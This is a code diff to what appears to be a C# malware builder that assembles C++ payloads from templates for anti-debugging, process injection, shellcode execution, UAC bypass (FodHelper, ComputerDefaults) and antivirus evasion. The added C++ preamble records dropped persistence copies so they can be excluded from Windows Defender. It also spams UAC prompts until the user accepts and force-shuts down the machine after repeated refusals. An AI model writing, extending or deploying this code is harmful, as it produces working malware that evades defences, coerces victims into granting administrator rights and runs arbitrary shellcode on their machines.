@@ -90,12 +90,172 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
 }
 """;
 
+    private const string SharedPreamble = """
+#include <shellapi.h>
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "advapi32.lib")
+
+// Shared washmachine runtime: persistence-drop tracker + UAC helpers.
+// All persistence snippets call wash_track(path) for every dropped copy of the
+// running executable. The Evasion DefenderExclusion snippet iterates wash_copies[]
+// to register every drop with Add-MpPreference. wash_track_self() is invoked
+// automatically before main() via a static initializer so the running path is
+// always present even when no persistence snippet ran.
+static const size_t WASH_COPIES_MAX = 32;
+static wchar_t wash_copies[WASH_COPIES_MAX][MAX_PATH];
+static int wash_copies_count = 0;
+
+static void wash_track(const wchar_t* path)
+{
+    if (!path || wash_copies_count >= (int)WASH_COPIES_MAX)
+        return;
+
+    size_t len = wcslen(path);
+    if (len == 0 || len >= MAX_PATH)
+        return;
+
+    // Skip duplicates so the same path is not registered twice.
+    for (int i = 0; i < wash_copies_count; i++)
+        if (_wcsicmp(wash_copies[i], path) == 0)
+            return;
+
+    wcscpy_s(wash_copies[wash_copies_count], MAX_PATH, path);
+    wash_copies_count++;
+}
+
+static void wash_track_self(void)
+{
+    wchar_t self[MAX_PATH] = {0};
+    if (GetModuleFileNameW(NULL, self, MAX_PATH) > 0)
+        wash_track(self);
+}
+
+static BOOL wash_is_elevated(void)
+{
+    BOOL elevated = FALSE;
+    HANDLE token = NULL;
+
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
+    {
+        TOKEN_ELEVATION elevation = {0};
+        DWORD size = sizeof(elevation);
+
+        if (GetTokenInformation(token, TokenElevation, &elevation, size, &size))
+            elevated = elevation.TokenIsElevated;
+
+        CloseHandle(token);
+    }
+
+    return elevated;
+}
+
+// Best-effort forced shutdown when the operator refuses to elevate. Tries the
+// privileged ExitWindowsEx path first (after enabling SE_SHUTDOWN_NAME), then
+// falls back to spawning shutdown.exe which works under the regular user
+// "Shut down the system" right that is granted by default.
+static void wash_force_shutdown(void)
+{
+    HANDLE token = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
+    {
+        TOKEN_PRIVILEGES tp = {0};
+        if (LookupPrivilegeValueW(NULL, L"SeShutdownPrivilege", &tp.Privileges[0].Luid))
+        {
+            tp.PrivilegeCount = 1;
+            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+            AdjustTokenPrivileges(token, FALSE, &tp, 0, NULL, NULL);
+        }
+        CloseHandle(token);
+    }
+
+    ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE | EWX_FORCEIFHUNG, 0);
+
+    // Fallback: invoke shutdown.exe directly. Default user policy permits this.
+    wchar_t cmd[] = L"shutdown.exe /s /t 0 /f";
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+    {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+
+    ExitProcess(1);
+}
+
+// Spam-loop UAC: re-launches the current binary with the "runas" verb until the
+// user accepts. maxDenials == 0 means loop forever. Any positive value triggers
+// wash_force_shutdown() once exceeded, satisfying "say yes or shutdown the PC".
+// retryMs is the back-off between dialog dismissals; defaults to 300ms when 0.
+static void wash_demand_elevation_or_shutdown(DWORD maxDenials, DWORD retryMs)
+{
+    if (wash_is_elevated())
+        return;
+
+    if (retryMs == 0)
+        retryMs = 300;
+
+    wchar_t modulePath[MAX_PATH] = {0};
+    GetModuleFileNameW(NULL, modulePath, MAX_PATH);
+
+    DWORD denials = 0;
+    while (!wash_is_elevated())
+    {
+        HINSTANCE result = ShellExecuteW(NULL, L"runas", modulePath, NULL, NULL, SW_SHOW);
+
+        if ((INT_PTR)result <= 32)
+        {
+            // SE_ERR_ACCESSDENIED (5) or SE_ERR_NOASSOC: user dismissed the prompt.
+            denials++;
+            if (maxDenials != 0 && denials >= maxDenials)
+            {
+                wash_force_shutdown();
+                return; // not reached
+            }
+            Sleep(retryMs);
+            continue;
+        }
+
+        // Elevated copy started successfully; current process can exit.
+        ExitProcess(0);
+    }
+}
+
+// Backwards-compatible: loop forever until elevation is granted.
+static void wash_demand_elevation(void)
+{
+    wash_demand_elevation_or_shutdown(0, 300);
+}
+
+// File-scope object whose constructor runs before main() and registers the
+// running executable path in wash_copies[]. Removes the need for snippets to
+// call wash_track_self() explicitly.
+struct __wash_self_track_init { __wash_self_track_init() { wash_track_self(); } };
+static __wash_self_track_init __wash_self_track_init_instance;
+""";
+
     private const string TemplateAntiDebug = "ANTIDEBUGGING";
     private const string TemplateProcessInjection = "PSINJECTION";
     private const string TemplateShellcodeExecution = "SHELLCODEEXECUTION";
     private const string TemplateUacBypass = "UACB";
+    private const string TemplateEvasion = "EVASION";
     private const string GenericShellcodeTemplatePlaceholder = "GENERICSHELLCODE";
     private const string TemplateGuardrail = "GUARDRAIL";
+
+    /// <summary>
+    /// Maps a <c>requires:</c> capability token (declared on a snippet item in
+    /// the YAML catalog) to the snippet section template it depends on.
+    /// Currently only <c>uac_bypass</c> is wired; other tokens are reserved.
+    /// </summary>
+    private static readonly Dictionary<string, string> RequiresTokenToSectionTemplate =
+        new(StringComparer.OrdinalIgnoreCase)
+        {
+            ["uac_bypass"] = TemplateUacBypass,
+        };
+
+    private const string StubSelectionId = "None";
 
     private const string PlaceholderProcessLookupHelper = "PROCESS_LOOKUP_HELPER";
     private const string PlaceholderShellcodeSource = "SHELLCODE_SOURCE";
@@ -250,6 +410,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
 
             await ApplyShellcodeAsync(plan, data, shellcodeSource, sessionDir, notes, log, cancellationToken).ConfigureAwait(false);
             ApplyFeatureSelections(plan, data, template, notes);
+            ValidateSnippetRequires(plan, template, notes);
 
             var sourceDir = Path.Combine(sessionDir, "source");
             var sourceCode = RenderTemplate(plan, template);
@@ -1343,6 +1504,91 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
     }
 
 
+    /// <summary>
+    /// Walks every selected snippet item recorded in <see cref="CppCompilationPlan.SelectedSnippets"/>
+    /// and verifies that each <c>requires:</c> capability token is satisfied:
+    /// the corresponding section's placeholder must exist in the template AND
+    /// the user must have picked a non-stub item for that section. Any miss
+    /// throws <see cref="InvalidOperationException"/> with a clear remediation.
+    /// </summary>
+    private void ValidateSnippetRequires(
+        CppCompilationPlan plan,
+        CodeTemplateDefinition template,
+        ICollection<string> notes)
+    {
+        ArgumentNullException.ThrowIfNull(plan);
+        ArgumentNullException.ThrowIfNull(template);
+
+        if (plan.SelectedSnippets.Count == 0)
+            return;
+
+        foreach (var (sectionTemplate, itemIds) in plan.SelectedSnippets)
+        {
+            if (!_snippets.TryResolveSection(sectionTemplate, out var section))
+                continue;
+
+            foreach (var itemId in itemIds.Distinct(StringComparer.OrdinalIgnoreCase))
+            {
+                if (!section.TryGetItem(itemId, out var item) || item.Requires.Count == 0)
+                    continue;
+
+                foreach (var requirement in item.Requires)
+                {
+                    if (!RequiresTokenToSectionTemplate.TryGetValue(requirement, out var requiredSectionTemplate))
+                    {
+                        // Reserved-for-future token. Log once and move on.
+                        var msg = $"Snippet '{section.Template}:{item.Id}' declares unknown requirement '{requirement}'. Ignoring (reserved).";
+                        notes.Add(msg);
+                        _logger.Debug(msg);
+                        continue;
+                    }
+
+                    EnsureRequirementSatisfied(plan, template, section, item, requirement, requiredSectionTemplate);
+                }
+            }
+        }
+    }
+
+    private void EnsureRequirementSatisfied(
+        CppCompilationPlan plan,
+        CodeTemplateDefinition template,
+        CodeSnippetSection requiringSection,
+        CodeSnippetItem requiringItem,
+        string requirement,
+        string requiredSectionTemplate)
+    {
+        bool templateExposesPlaceholder = template.Placeholders.Any(p =>
+            p != null &&
+            p.Kind == TemplatePlaceholderKind.Snippet &&
+            !string.IsNullOrWhiteSpace(p.SnippetTemplateKey) &&
+            string.Equals(p.SnippetTemplateKey.Trim(), requiredSectionTemplate, StringComparison.OrdinalIgnoreCase));
+
+        if (!templateExposesPlaceholder)
+        {
+            throw new InvalidOperationException(
+                $"Snippet '{requiringSection.Template}:{requiringItem.Id}' requires '{requirement}' but template " +
+                $"'{template.Id}' does not expose the matching '{requiredSectionTemplate}' placeholder. " +
+                $"Pick a different template (default/paranoid/aggressive/stealth) or remove the snippet.");
+        }
+
+        if (!plan.SelectedSnippets.TryGetValue(requiredSectionTemplate, out var picks) || picks.Count == 0)
+        {
+            throw new InvalidOperationException(
+                $"Snippet '{requiringSection.Template}:{requiringItem.Id}' requires '{requirement}' but no " +
+                $"'{requiredSectionTemplate}' selection was made. Choose a non-'None' option for the " +
+                $"{requiredSectionTemplate.ToUpperInvariant()} placeholder.");
+        }
+
+        bool hasNonStubPick = picks.Any(id => !string.Equals(id, StubSelectionId, StringComparison.OrdinalIgnoreCase));
+        if (!hasNonStubPick)
+        {
+            throw new InvalidOperationException(
+                $"Snippet '{requiringSection.Template}:{requiringItem.Id}' requires '{requirement}' but the " +
+                $"'{requiredSectionTemplate}' selection is set to '{StubSelectionId}'. Pick a real method " +
+                $"(e.g. FodHelper, ComputerDefaults, UacLoop) so the dependency is satisfied.");
+        }
+    }
+
     private void ApplyFeatureSelections(
         CppCompilationPlan plan,
         UiData data,
@@ -1378,7 +1624,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
                         templateKey,
                         placeholder.Name,
                         notes,
-                        (p, item) => p.ShellcodeExecutionSnippet = item.Snippet);
+                        (p, s) => p.ShellcodeExecutionSnippet = s);
                     break;
                 case TemplateUacBypass:
                     ApplyComboSelection(
@@ -1387,7 +1633,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
                         templateKey,
                         placeholder.Name,
                         notes,
-                        (p, item) => p.UacBypassSnippet = item.Snippet);
+                        (p, s) => p.UacBypassSnippet = s);
                     break;
                 case TemplateAntiDebug:
                     ApplyAntiDebugSelection(plan, data, placeholder.Name, notes);
@@ -1438,13 +1684,16 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         string templateKey,
         string placeholderName,
         ICollection<string> notes,
-        Action<CppCompilationPlan, CodeSnippetItem> apply)
+        Action<CppCompilationPlan, string>? applySubstituted = null)
     {
         if (!TryGetFirstSelection(data, templateKey, out var section, out var selection))
             return;
 
-        apply(plan, selection);
+        // Perform token substitution first so the plan property receives the
+        // already-expanded text; AddHeaderBlock in BuildPlaceholderValues will
+        // then use the substituted value and won't clobber CustomSnippetBlocks.
         string snippet = SubstituteAndCollect(plan, data, section, selection, notes);
+        applySubstituted?.Invoke(plan, snippet);
         AddCustomSnippet(plan, placeholderName, snippet);
         LogSnippetEnabled(section.Template, selection.Id, notes);
     }
@@ -1618,6 +1867,19 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         if (!string.IsNullOrWhiteSpace(implementation))
             plan.SnippetImplementations.Add(implementation);
 
+        // Record the selection so ValidateSnippetRequires can check that any
+        // snippet declaring requires: [uac_bypass] (or similar) ends up paired
+        // with a non-stub pick from the corresponding section.
+        if (!string.IsNullOrWhiteSpace(section.Template) && !string.IsNullOrWhiteSpace(item.Id))
+        {
+            if (!plan.SelectedSnippets.TryGetValue(section.Template, out var selectedIds))
+            {
+                selectedIds = new List<string>();
+                plan.SelectedSnippets[section.Template] = selectedIds;
+            }
+            selectedIds.Add(item.Id);
+        }
+
         // Log any non-default param values
         foreach (var input in item.Inputs)
         {
@@ -1706,9 +1968,12 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
                 values[entry.Key] = block;
         }
 
-        // Template preamble (shared type definitions, helper functions).
+        // Shared preamble (path tracking, UAC helpers) - always injected.
+        AddPlaceholder(values, PlaceholderPreamble, SharedPreamble, overwrite: true);
+        
+        // Template preamble (shared type definitions, helper functions) - appended to shared preamble.
         if (!string.IsNullOrWhiteSpace(template.Preamble))
-            AddPlaceholder(values, PlaceholderPreamble, template.Preamble, overwrite: true);
+            AddPlaceholder(values, PlaceholderPreamble, template.Preamble, overwrite: false);
 
         // Deduplicate and inject snippet includes.
         if (plan.SnippetIncludes.Count > 0)
